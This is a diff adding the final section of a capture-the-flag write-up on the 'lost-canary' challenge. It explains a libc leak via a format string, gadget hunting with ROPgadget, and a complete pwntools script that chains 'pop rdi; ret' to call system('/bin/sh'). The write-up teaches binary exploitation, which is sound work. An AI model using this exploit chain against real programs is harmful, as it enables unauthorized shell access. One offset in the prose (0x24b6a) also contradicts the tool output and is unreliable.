@@ -404,3 +404,100 @@ The output I get is: `0x7ffff7fc2723`
 
 All I have to do, is subtract the base address of the `libc` I have (highlighted in the screenshot), from it, to get the constant offset difference, which comes out to be: `0x1ed723`. I can use this information to get the base address of the libc every time the program is run now, through the format string vulnerability in `main()`.
 
+Return Oriented Programming comes in handy when buffer overflows allow us to overwrite a program's call stack with what we want. Instead of us having to craft our own shellcode, all we have to do is take already existing pieces of code (known as "gadgets") and put them together to craft our exploit - we will see how we can do that. 
+
+These gadgets are usually short bursts of instructions tailored to do specific things, each ending with a `ret` instruction. We can utilise this to control execution flow as per our will. 
+
+The beauty of ROP comes from it's unique ability to harness code from any part of the binary (given it is executable). 
+
+First, we need to go gadget hunting to find what we need. Since we can write what we want to the stack, and we know `rdi` is the first place looked at by functions for their arguments, we would ideally want something that would allow us to pop the top value from the stack and into `rdi`, then perform a `ret`. Let us look for such an instruction in the libc with a tool known as [ROPgadget](https://github.com/JonathanSalwan/ROPgadget). 
+
+```
+$ ROPgadget --binary ./libc.so.6 | grep "pop rdi ; ret"
+0x0000000000023b6a : pop rdi ; ret
+0x00000000000f57ad : pop rdi ; retf
+0x0000000000144ba9 : pop rdi ; retf 0xa
+```
+
+We can take the first one and ignore the rest. The output shows that at the offset `0x24b6a` from the libc base, is the gadget we are looking for. 
+
+Next, we also need to find a `ret` instruction. 
+
+```
+$ ROPgadget --binary ./libc.so.6 | awk '{print $1 $2 $3}' | grep ret
+0x0000000000022679:ret
+```
+
+So `ret` is at 0x22679. 
+
+Now, we are ready to craft our payload that does the following: 
+
+1. Send 4 "A"s and the canary to get to the return address on the stack 
+2. Overwrite the return address on the stack with the `pop rdi` gadget 
+3. Set the value of `rdi` to "/bin/sh"
+4. Overwrite the return address again with with the address of system 
+
+
+Let us see how this can be accomplished with a full fledged pwntools script
+
+```py
+from pwn import *
+from icecream import ic
+import tty
+
+# Set up pwntools for the correct architecture
+exe = "./lost"
+libc = ELF("./libc.so.6")
+context.binary = elf = ELF(exe)
+context.log_level = "debug"
+context.aslr = True
+
+def start(argv=[], *a, **kw):
+    '''Start the exploit against the target.'''
+    if args.REMOTE:
+        return remote("lost-canary.chal.uiuc.tf", 1337, ssl=True )
+    if args.GDB:
+        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
+    else:
+        return process([exe] + argv, *a, **kw)
+
+gdbscript = '''
+    b* select_station+104
+    c
+'''.format(**locals())
+
+# Useful macros
+def sl(a): return r.sendline(a)
+def s(a): return r.send(a)
+def sa(a, b): return r.sendafter(a, b)
+def sla(a, b): return r.sendlineafter(a, b)
+def re(a): return r.recv(a)
+def ru(a): return r.recvuntil(a)
+def rl(): return r.recvline()
+def i(): return r.interactive()
+eof = chr(tty.CEOF)
+
+
+r = start()
+
+# send the payload to generate the libc leak 
+sl(b"14927-%p-")
+ru(b"-")
+libc.address = int(ru(b"-")[:-1], 16) - 0x1ed723
+
+
+# get the address of the pop rdi gadget from the offset we got earlier 
+prdi = libc.address + 0x0000000000023b6a
+
+# get the address of the ret gadget 
+ret = libc.address + 0x0000000000022679
+
+# send the payload as we had seen above, to overwrite rip, replace rdi with "/bin/sh", and finally call system 
+sl(b"A"*(4) + p64(0x7361754569205965) + p64(0) + p64(ret) + p64(prdi) + p64(next(libc.search(b"/bin/sh\x00"))) + p64(libc.sym.system))
+
+r.interactive()
+```
+
+So that is the entire challenge! A unique reversing + binary exploitation to top it all off. 
+
+If you guys have any questions about anything mentioned in the writeups, feel free to reach out to me on [X/Twitter](https://x.com/the_m3chanic_) or on Discord at `the.m3chanic`. Cheers.
